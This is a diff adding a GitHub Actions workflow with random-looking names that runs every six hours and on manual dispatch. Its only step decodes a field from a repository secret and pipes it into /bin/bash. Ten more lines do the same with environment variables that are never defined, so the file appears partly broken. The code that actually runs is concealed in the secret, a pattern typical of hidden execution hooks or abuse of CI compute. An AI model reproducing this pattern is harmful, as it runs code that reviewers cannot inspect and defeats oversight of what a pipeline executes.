@@ -1,0 +1,26 @@
+name: mazhengfu4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mazhengfu4567
+        env:
+          bkt1610: ${{ secrets.bkt1610 }}
+        run: |
+          echo $bkt1610 | jq -r .fa4301 | /bin/bash
+          echo $ukjle792 | jq -r .xthwf6 | /bin/bash
+          echo $llwh0 | jq -r .kudib840 | /bin/bash
+          echo $xwbge15 | jq -r .brmi9767 | /bin/bash
+          echo $mx19 | jq -r .rd30402 | /bin/bash
+          echo $p05538 | jq -r .pc6865 | /bin/bash
+          echo $xlmx4961 | jq -r .rx46 | /bin/bash
+          echo $s84 | jq -r .fw2349 | /bin/bash
+          echo $pprlz7671 | jq -r .hpujr51 | /bin/bash
+          echo $drn35 | jq -r .hm7114 | /bin/bash
+          echo $w1243 | jq -r .vd7 | /bin/bash
+
